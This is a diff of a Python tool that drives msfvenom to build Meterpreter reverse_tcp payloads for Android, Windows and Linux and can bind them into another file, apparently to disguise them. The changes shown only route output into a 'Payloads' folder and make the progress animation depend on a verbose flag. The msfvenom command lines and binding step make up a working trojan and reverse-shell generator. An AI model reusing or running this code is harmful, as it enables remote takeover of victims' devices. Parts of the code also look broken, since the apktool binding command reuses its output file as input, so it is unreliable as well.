@@ -2,9 +2,9 @@ import os
 import platform
 import logging
 import subprocess
-import threading  # Added for threading support
+import threading
 from tkinter import Tk, filedialog
-from pyfiglet import Figlet  # You'll need to install the 'pyfiglet' library
+from pyfiglet import Figlet
 import sys
 import time
 
@@ -28,6 +28,11 @@ def get_bind_file_path():
     else:
         file_path = input("Enter the path to the file you want to bind: ")
     return file_path
+
+# Function to create the "Payloads" folder if it doesn't exist
+def create_payloads_folder():
+    if not os.path.exists("Payloads"):
+        os.makedirs("Payloads")
 
 # Function to execute a command and capture the output
 def execute_command(command, verbose=False):
@@ -59,8 +64,9 @@ def generate_payload_with_animation(ip, port, payload_type, android_api_level=No
 
     try:
         done = False
-        animation_thread = threading.Thread(target=display_animation)
-        animation_thread.start()
+        if verbose:
+            animation_thread = threading.Thread(target=display_animation)
+            animation_thread.start()
 
         if not ip or not port:
             raise ValueError("IP address and port are required.")
@@ -72,23 +78,25 @@ def generate_payload_with_animation(ip, port, payload_type, android_api_level=No
             if not android_api_level:
                 raise ValueError("Android API level is required for Android payloads.")
 
-            output_file = "payload.apk"
+            output_file = f"Payloads/payload.apk"
             payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file} -t apk -a dalvik --platform android -A {android_api_level}"
 
         elif payload_type == "windows":
-            output_file = "payload.exe"
+            output_file = f"Payloads/payload.exe"
             payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o {output_file}"
 
         elif payload_type == "linux":
-            output_file = "payload.elf"
+            output_file = f"Payloads/payload.elf"
             payload_command = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f elf -o {output_file}"
+
+        create_payloads_folder()
 
         if bind:
             if not bind_file:
                 bind_file = get_bind_file_path()
 
             if payload_type == "android":
-                output_file = "bind_payload.apk"
+                output_file = f"Payloads/bind_payload.apk"
                 binding_command = f"apktool b {output_file} -o {output_file} -f {bind_file}"
                 bind_output = execute_command(binding_command, verbose)
                 if "Exception" in bind_output:
@@ -100,19 +108,21 @@ def generate_payload_with_animation(ip, port, payload_type, android_api_level=No
         if "Exception" in payload_output:
             raise Exception(f"Payload generation failed: {payload_output}")
 
-        done = True  # Stop animation
-        print("\n")
+        done = True
+        if verbose:
+            print("\n")
         success_message = f"{payload_type.capitalize()} payload generated successfully as '{output_file}'{' (and bound)' if bind else ''}"
         log.info(success_message)
         return success_message
     except Exception as e:
-        done = True  # Stop animation
-        print("\n")
+        done = True
+        if verbose:
+            print("\n")
         log.error(str(e))
         return str(e)
 
 if __name__ == "__main__":
-    verbose = True
+    verbose = False  # Set this to False to suppress the animation and command execution messages
 
     ip = input("Enter your IP address: ")
     port = input("Enter the port: ")
